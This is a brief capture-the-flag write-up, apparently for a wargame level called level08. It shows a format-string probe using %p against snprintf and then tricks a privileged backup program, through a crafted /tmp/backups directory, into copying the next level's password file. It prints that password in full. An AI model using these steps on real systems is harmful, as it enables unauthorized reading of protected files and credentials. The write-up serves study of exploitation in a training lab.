# level08

<!-- As we can see in `log_wrapper`, the format of `snprintf()` is a variable, creating a vulnerability.  

```sh
$> ./level08 "$(python -c 'print("AAAAAAAA" + "%p "*11)')"

$> cat backups/.log 
LOG: Starting back up: AAAAAAAA0xffffffffffffffec 0xec 0x400d6c 0xffffffffffffffff 0x7fffffffe8cd 0x400d96 0x603010 0x676e697472617453 0x7075206b63616220 0x414141414141203a 0x6666666678304141
```
*Our `'A's` are on the 10th position on the stack.*
 -->

We basically need to find a way to have :
- a file (`argv[1]`) existing in the directory we execute the program from.
- a path that exists in the subfolder `./backups`.

(i.e: `./backups/file` & `./file` must exist)

The problem is that we can't create a directory in `~`.  
But we can do it in `/tmp` !  

```sh
$> cd /tmp

$> pwd
/tmp

$> mkdir -p ./backups/home/users/level09/

$> ~/level08 /home/users/level09/.pass

$> cat /tmp/backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
